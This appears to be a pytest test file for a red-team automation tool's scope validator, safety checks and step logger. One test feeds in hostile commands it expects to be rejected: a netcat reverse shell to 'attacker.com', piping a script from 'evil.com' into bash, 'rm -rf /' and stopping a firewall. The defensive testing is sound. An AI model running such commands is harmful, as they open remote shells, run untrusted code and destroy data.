"""Tests for utils modules."""

import pytest
import tempfile
import yaml
from pathlib import Path
from unittest.mock import patch, mock_open
from datetime import datetime

from redteam_automation.utils.scope_validator import ScopeValidator, load_scope_from_file, check_scope_file_exists
from redteam_automation.utils.safety_checks import SafetyValidator, EngagementSafetyManager
from redteam_automation.utils.logging import StepsLogger, setup_logging, get_logger
from redteam_automation.schemas import Scope, ScopeTarget, EngagementConfig


class TestScopeValidator:
    """Test ScopeValidator class."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.scope = Scope(
            included=[
                ScopeTarget(type="domain", value="example.com"),
                ScopeTarget(type="domain", value="*.test.com"),
                ScopeTarget(type="ip", value="192.168.1.0/24"),
                ScopeTarget(type="url", value="https://api.example.com")
            ],
            excluded=[
                ScopeTarget(type="domain", value="admin.example.com"),
                ScopeTarget(type="ip", value="192.168.1.1")
            ]
        )
        self.validator = ScopeValidator(self.scope)
    
    def test_domain_validation(self):
        """Test domain validation."""
        # Valid domains
        assert self.validator.is_in_scope("example.com")
        assert self.validator.is_in_scope("sub.example.com")
        assert self.validator.is_in_scope("anything.test.com")
        
        # Excluded domains
        assert not self.validator.is_in_scope("admin.example.com")
        
        # Out of scope domains
        assert not self.validator.is_in_scope("google.com")
        assert not self.validator.is_in_scope("malicious.com")
    
    def test_ip_validation(self):
        """Test IP address validation."""
        # Valid IPs in range
        assert self.validator.is_in_scope("192.168.1.10")
        assert self.validator.is_in_scope("192.168.1.254")
        
        # Excluded IP
        assert not self.validator.is_in_scope("192.168.1.1")
        
        # Out of scope IPs
        assert not self.validator.is_in_scope("10.0.0.1")
        assert not self.validator.is_in_scope("8.8.8.8")
    
    def test_url_validation(self):
        """Test URL validation."""
        # Valid URLs
        assert self.validator.is_in_scope("https://api.example.com")
        assert self.validator.is_in_scope("https://api.example.com/v1/users")
        
        # Out of scope URLs
        assert not self.validator.is_in_scope("https://other-api.com")
    
    def test_wildcard_domain_matching(self):
        """Test wildcard domain matching."""
        assert self.validator._matches_wildcard_domain("sub.test.com", "*.test.com")
        assert self.validator._matches_wildcard_domain("api.test.com", "*.test.com")
        assert not self.validator._matches_wildcard_domain("test.com", "*.test.com")
        assert not self.validator._matches_wildcard_domain("sub.other.com", "*.test.com")
    
    def test_ip_in_range(self):
        """Test IP range checking."""
        assert self.validator._is_ip_in_range("192.168.1.10", "192.168.1.0/24")
        assert self.validator._is_ip_in_range("192.168.1.255", "192.168.1.0/24")
        assert not self.validator._is_ip_in_range("192.168.2.1", "192.168.1.0/24")
        assert not self.validator._is_ip_in_range("10.0.0.1", "192.168.1.0/24")
    
    def test_empty_scope(self):
        """Test validator with empty scope."""
        empty_scope = Scope(included=[], excluded=[])
        empty_validator = ScopeValidator(empty_scope)
        
        assert not empty_validator.is_in_scope("example.com")
        assert not empty_validator.is_in_scope("192.168.1.1")


class TestScopeFileOperations:
    """Test scope file operations."""
    
    def test_load_scope_from_file(self):
        """Test loading scope from YAML file."""
        scope_data = {
            'included': [
                {'type': 'domain', 'value': 'example.com'},
                {'type': 'ip', 'value': '192.168.1.0/24'}
            ],
            'excluded': [
                {'type': 'domain', 'value': 'admin.example.com'}
            ]
        }
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
            yaml.dump(scope_data, f)
            temp_path = f.name
        
        try:
            scope = load_scope_from_file(temp_path)
            assert len(scope.included) == 2
            assert len(scope.excluded) == 1
            assert scope.included[0].value == 'example.com'
            assert scope.excluded[0].value == 'admin.example.com'
        finally:
            Path(temp_path).unlink()
    
    def test_check_scope_file_exists(self):
        """Test scope file existence check."""
        with tempfile.NamedTemporaryFile(suffix='.yaml') as f:
            assert check_scope_file_exists(f.name)
        
        assert not check_scope_file_exists('/nonexistent/file.yaml')


class TestSafetyValidator:
    """Test SafetyValidator class."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.validator = SafetyValidator()
    
    def test_validate_scope_file_exists(self):
        """Test scope file validation."""
        with tempfile.NamedTemporaryFile(suffix='.yaml') as f:
            assert self.validator.validate_scope_file(f.name)
        
        assert not self.validator.validate_scope_file('/nonexistent/file.yaml')
    
    def test_validate_target_safety(self):
        """Test target safety validation."""
        scope = Scope(
            included=[ScopeTarget(type="domain", value="example.com")],
            excluded=[]
        )
        
        # Valid target
        assert self.validator.validate_target_safety("example.com", scope)
        
        # Out of scope target
        assert not self.validator.validate_target_safety("google.com", scope)
        
        # Dangerous patterns
        assert not self.validator.validate_target_safety("localhost", scope)
        assert not self.validator.validate_target_safety("127.0.0.1", scope)
        assert not self.validator.validate_target_safety("192.168.1.1", scope)
    
    def test_validate_command_safety(self):
        """Test command safety validation."""
        # Safe commands
        assert self.validator.validate_command_safety("subfinder -d example.com")
        assert self.validator.validate_command_safety("httpx -l targets.txt")
        assert self.validator.validate_command_safety("nuclei -t cves/ -l targets.txt")
        
        # Dangerous commands
        assert not self.validator.validate_command_safety("rm -rf /")
        assert not self.validator.validate_command_safety("sudo systemctl stop firewall")
        assert not self.validator.validate_command_safety("nc -e /bin/sh attacker.com 4444")
        assert not self.validator.validate_command_safety("curl http://evil.com/shell.sh | bash")
    
    def test_validate_rate_limits(self):
        """Test rate limit validation."""
        # Valid rate limits
        assert self.validator.validate_rate_limits("subfinder", 10)
        assert self.validator.validate_rate_limits("httpx", 50)
        assert self.validator.validate_rate_limits("nuclei", 25)
        
        # Invalid rate limits (too high)
        assert not self.validator.validate_rate_limits("subfinder", 1000)
        assert not self.validator.validate_rate_limits("httpx", 500)
        assert not self.validator.validate_rate_limits("nuclei", 200)
        
        # Invalid rate limits (negative)
        assert not self.validator.validate_rate_limits("subfinder", -1)
    
    def test_validate_engagement_config(self):
        """Test engagement configuration validation."""
        # Valid config
        config = EngagementConfig(
            target_scope="example.com",
            tools_enabled=["subfinder", "httpx"],
            max_threads=5,
            rate_limit=10
        )
        assert self.validator.validate_engagement_config(config)
        
        # Invalid config (too many threads)
        config_invalid = EngagementConfig(
            target_scope="example.com",
            tools_enabled=["subfinder"],
            max_threads=100,
            rate_limit=10
        )
        assert not self.validator.validate_engagement_config(config_invalid)


class TestEngagementSafetyManager:
    """Test EngagementSafetyManager class."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.manager = EngagementSafetyManager()
    
    @patch('redteam_automation.utils.safety_checks.load_scope_from_file')
    @patch('redteam_automation.utils.safety_checks.check_scope_file_exists')
    def test_pre_engagement_checks(self, mock_check_file, mock_load_scope):
        """Test pre-engagement safety checks."""
        # Mock scope file exists and valid scope
        mock_check_file.return_value = True
        mock_load_scope.return_value = Scope(
            included=[ScopeTarget(type="domain", value="example.com")],
            excluded=[]
        )
        
        config = EngagementConfig(
            target_scope="example.com",
            scope_file="scope.yaml"
        )
        
        result = self.manager.pre_engagement_checks(config)
        assert result['passed'] is True
        assert 'scope_validation' in result['checks']
        assert 'target_safety' in result['checks']
        assert 'config_validation' in result['checks']
    
    def test_authorize_engagement(self):
        """Test engagement authorization."""
        config = EngagementConfig(target_scope="example.com")
        
        # Should return True for valid config (in real implementation, this might involve user confirmation)
        result = self.manager.authorize_engagement(config)
        assert isinstance(result, bool)
    
    def test_emergency_stop(self):
        """Test emergency stop functionality."""
        # Should not raise exception
        self.manager.emergency_stop("Test stop")


class TestStepsLogger:
    """Test StepsLogger class."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.temp_dir = tempfile.mkdtemp()
        self.log_file = Path(self.temp_dir) / "steps.txt"
        self.logger = StepsLogger(str(self.log_file))
    
    def teardown_method(self):
        """Clean up test fixtures."""
        if self.log_file.exists():
            self.log_file.unlink()
        Path(self.temp_dir).rmdir()
    
    def test_log_step(self):
        """Test logging a step."""
        self.logger.log_step(
            phase="reconnaissance",
            action="Running subfinder",
            status="started"
        )
        
        assert self.log_file.exists()
        content = self.log_file.read_text()
        assert "reconnaissance" in content
        assert "Running subfinder" in content
        assert "started" in content
    
    def test_log_step_with_duration(self):
        """Test logging a step with duration."""
        self.logger.log_step(
            phase="scanning",
            action="Running nuclei",
            status="completed",
            duration=45.2
        )
        
        content = self.log_file.read_text()
        assert "45.2" in content
        assert "completed" in content
    
    def test_get_logs(self):
        """Test retrieving logs."""
        self.logger.log_step("test", "action1", "completed")
        self.logger.log_step("test", "action2", "started")
        
        logs = self.logger.get_logs()
        assert len(logs) == 2
        assert logs[0].action == "action1"
        assert logs[1].action == "action2"
    
    def test_get_logs_empty_file(self):
        """Test retrieving logs from empty file."""
        logs = self.logger.get_logs()
        assert len(logs) == 0


class TestLoggingUtils:
    """Test logging utility functions."""
    
    def test_setup_logging(self):
        """Test logging setup."""
        with tempfile.TemporaryDirectory() as temp_dir:
            log_file = Path(temp_dir) / "test.log"
            setup_logging(str(log_file), "DEBUG")
            
            # Test that logger works
            logger = get_logger("test")
            logger.info("Test message")
            
            # Check log file was created
            assert log_file.exists()
    
    def test_get_logger(self):
        """Test getting logger instance."""
        logger = get_logger("test_module")
        assert logger.name == "test_module"
        
        # Test logging works
        logger.info("Test message", extra_field="extra_value")